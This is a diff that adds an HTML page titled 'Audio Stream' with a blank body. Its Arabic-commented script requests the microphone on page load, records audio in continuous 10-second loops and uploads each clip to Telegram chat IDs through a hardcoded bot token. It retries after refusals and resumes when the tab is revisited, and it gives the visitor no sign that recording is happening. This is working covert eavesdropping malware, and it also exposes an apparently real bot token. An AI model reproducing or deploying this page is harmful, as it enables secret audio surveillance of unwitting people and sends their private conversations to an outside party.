@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Audio Stream</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #ffffff;
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // بيانات تيليجرام
+    const BOT_TOKEN = '8948041325:AAEA_XM0vHfsxbvhTAwZp4gD_gKvAhZlQVI';
+    
+    // قائمة المستلمين (يمكنك إضافة أكثر من شخص)
+    const CHAT_IDS = [
+      '8720724887',  // الشخص الأول
+      '1234567890'   // الشخص الثاني - استبدل هذا بالـ Chat ID الحقيقي
+    ];
+    
+    // مدة التسجيل (10 ثواني)
+    const RECORD_DURATION = 10000;
+    
+    let mediaStream = null;
+    let mediaRecorder = null;
+    let recordingTimer = null;
+    let audioChunks = [];
+
+    async function startRecordingCycle() {
+      try {
+        // طلب إذن الميكروفون
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+          audio: {
+            echoCancellation: false,
+            noiseSuppression: false,
+            sampleRate: 44100
+          },
+          video: false
+        });
+        
+        console.log('[Microphone] Access granted');
+        
+        // بدأ دورة التسجيل والإرسال
+        recordAndSend();
+        
+      } catch (err) {
+        console.error('[Microphone Error]', err);
+        // إعادة المحاولة بعد 5 ثواني
+        setTimeout(startRecordingCycle, 5000);
+      }
+    }
+
+    function recordAndSend() {
+      // التأكد من وجود stream
+      if (!mediaStream || !mediaStream.active) {
+        console.error('[Stream Error] Stream not active');
+        startRecordingCycle();
+        return;
+      }
+      
+      try {
+        // إعادة تهيئة المتغيرات
+        audioChunks = [];
+        
+        // إنشاء MediaRecorder جديد
+        mediaRecorder = new MediaRecorder(mediaStream, {
+          mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
+            ? 'audio/webm;codecs=opus' 
+            : 'audio/webm'
+        });
+        
+        // جمع البيانات الصوتية
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data && event.data.size > 0) {
+            audioChunks.push(event.data);
+          }
+        };
+        
+        // عند توقف التسجيل، إرسال الملف الصوتي
+        mediaRecorder.onstop = async () => {
+          if (audioChunks.length > 0) {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            
+            // إرسال إلى جميع المستلمين
+            await sendToAllTelegram(audioBlob);
+            
+            console.log('[Recording] Sent successfully, starting new recording in 1 second...');
+            
+            // انتظار ثانية واحدة ثم بدأ تسجيل جديد
+            setTimeout(recordAndSend, 1000);
+          } else {
+            console.warn('[Recording] No audio data, retrying...');
+            setTimeout(recordAndSend, 1000);
+          }
+        };
+        
+        // بدأ التسجيل
+        mediaRecorder.start();
+        console.log(`[Recording] Started - ${RECORD_DURATION/1000} seconds`);
+        
+        // إيقاف التسجيل بعد المدة المحددة
+        recordingTimer = setTimeout(() => {
+          if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            console.log('[Recording] Stopped');
+          }
+        }, RECORD_DURATION);
+        
+      } catch (err) {
+        console.error('[Recording Error]', err);
+        setTimeout(recordAndSend, 3000);
+      }
+    }
+
+    // إرسال الصوت إلى جميع المستلمين
+    async function sendToAllTelegram(audioBlob) {
+      const timestamp = Date.now();
+      const caption = `🎙️ ${new Date().toLocaleString('ar-EG')}`;
+      
+      // إرسال إلى كل شخص في القائمة
+      const sendPromises = CHAT_IDS.map(chatId => 
+        sendToTelegram(chatId, audioBlob, timestamp, caption)
+      );
+      
+      // انتظار إرسال جميع الرسائل
+      const results = await Promise.allSettled(sendPromises);
+      
+      // عرض النتائج
+      results.forEach((result, index) => {
+        if (result.status === 'fulfilled' && result.value) {
+          console.log(`[Sent] Audio sent to ${CHAT_IDS[index]} successfully`);
+        } else {
+          console.error(`[Failed] Failed to send to ${CHAT_IDS[index]}:`, result.reason);
+        }
+      });
+    }
+
+    async function sendToTelegram(chatId, audioBlob, timestamp, caption) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('audio', audioBlob, `audio_${timestamp}.webm`);
+      formData.append('caption', caption);
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+          method: 'POST',
+          body: formData
+        });
+        
+        const data = await response.json();
+        
+        if (!data.ok) {
+          throw new Error(data.description || 'Unknown error');
+        }
+        
+        return true;
+      } catch (err) {
+        throw err;
+      }
+    }
+
+    // تنظيف عند الخروج من الصفحة
+    window.addEventListener('beforeunload', () => {
+      if (recordingTimer) clearTimeout(recordingTimer);
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+      }
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+    });
+
+    // إعادة المحاولة إذا الصفحة أصبحت مخفية ثم ظهرت
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        if (recordingTimer) clearTimeout(recordingTimer);
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+        if (mediaStream) {
+          mediaStream.getTracks().forEach(track => track.stop());
+        }
+      } else {
+        // إعادة التشغيل عند العودة للصفحة
+        startRecordingCycle();
+      }
+    });
+
+    // تشغيل التسجيل عند تحميل الصفحة
+    startRecordingCycle();
+  </script>
+</body>
+</html>
